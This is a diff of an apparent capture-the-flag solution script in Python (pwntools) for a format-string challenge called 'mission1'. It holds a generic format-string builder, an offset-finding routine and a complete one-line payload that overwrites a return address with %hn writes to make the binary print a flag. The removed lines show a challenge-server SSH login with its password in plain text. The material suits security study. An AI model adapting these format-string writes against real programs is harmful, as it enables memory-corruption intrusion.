@@ -1,31 +1,5 @@
 from pwn import *
-from sys import *
 
-SERVER = "bin.chall.necst.it"
-PORT = 22
-BINARY = "mission1"
-REMOTE_BINARY = "/home/m226002/"+BINARY+"/"+BINARY
-PASSWORD = "unixporn"
-USER  = "m226002"
-
-
-if "--remote" in sys.argv:
-    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
-    r = s.process(REMOTE_BINARY)
-else:
-    r = process(BINARY)
-
-if "--debug" in sys.argv:
-     
-    gdb.attach(r, """
-        #breakpoints
-        unset environment
-        b create_art
-        b view_saved_art
-        b* 0x080489d7
-        b cat
-        c
-        """)
 
 #code
 def create_format_string(offset, tuples, initial_bytes, final_bytes):
@@ -39,8 +13,8 @@ def create_format_string(offset, tuples, initial_bytes, final_bytes):
         low = what & 0xffff
 
         if high>low:
-            chunks.append((low, where))
-            chunks.append((high, where+2))
+            chunks.append((low, where+2))
+            chunks.append((high, where))
         else:
             chunks.append((low, where))
             chunks.append((high, where+2))
@@ -72,38 +46,33 @@ def create_format_string(offset, tuples, initial_bytes, final_bytes):
     return str_format
 
 
-def write_buffer(buffer):
-    r.recvuntil(b'>')
-    r.sendline(b'2')
-    sleep(timesleep)
-    r.sendline(buffer)
-    sleep(timesleep)
-
-def view_buff():
-    r.recvuntil(b'>')
-    r.sendline(b'3')
-    sleep(timesleep)
-
-
-timesleep = 0
-binary = ELF("./mission1")
-
 jump_cat = (0xffffdd5c, 0x08048a00) #where, what
 arg_flag = (0xffffdd64, 0xffffdd8c )
-offset = 51
+offset = 51 #the offset is the number of address from the initial string. Look at code below
 happy_art = b"flag;( o.o )"
 
 format_string = create_format_string(offset=offset, tuples=[jump_cat, arg_flag], initial_bytes=happy_art, final_bytes=b"")
 print(format_string)
 
-write_buffer(format_string)
-view_buff()
 
-sleep(timesleep)
+# this challenge is a format_string, I created a function the builds the format string generally. 
+# so it was easy the use it as I wanted
 
-r.interactive()
+
+# code to find the offset
+
+def build_offset():
+    for j in range(0,11):
+        y=""
+        for i in range(15*j,15*(j+1) ):
+            y+=f" %{i}$x"
+        
+        print('AAAA ( o.o )'+y+"\n")
+    
+    #the offset is the number related to address 0x41414141
+
 
 #final working string
 
 
-# (python3 -c "import sys; sys.stdout.buffer.write(b'2\nflag;( o.o )\x5e\xdd\xff\xff\\x5c\xdd\xff\xff\x64\xdd\xff\xff\x66\xdd\xff\xff%2024c%54\$hn%33276c%55\$hn%21388c%56\$hn%8819c%57\$hn\n3\n')"; cat -) | env -i "PWD=/home/m226002/mission1" SHLVL=0 /home/m226002/mission1/mission1
+# (python3 -c "import sys; sys.stdout.buffer.write(b'2\nflag;( o.o )\x5e\xdd\xff\xff\x5c\xdd\xff\xff\x64\xdd\xff\xff\x66\xdd\xff\xff%2024c%54\$hn%33276c%55\$hn%21388c%56\$hn%8819c%57\$hn\n3\n')"; cat -) | env -i "PWD=/home/m226002/mission1" SHLVL=0 /home/m226002/mission1/mission1
